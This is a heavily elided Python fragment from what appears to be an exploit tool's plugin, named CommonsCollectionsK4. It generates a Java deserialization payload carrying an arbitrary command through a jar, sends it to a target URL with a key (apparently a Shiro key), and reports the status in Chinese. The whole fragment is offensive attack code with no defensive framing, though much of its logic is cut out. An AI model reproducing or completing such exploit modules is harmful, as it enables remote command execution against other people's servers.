...
@Idea.plugin_register('Class33:CommonsCollectionsK4')
class CommonsCollectionsK4(object):
    ...
    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollectionsK4', command],       #popen
        ...
        try:
            ...
            if(x.status_code==200):
                ...
                print("[+]   ****CommonsCollectionsK4模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****CommonsCollectionsK4模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
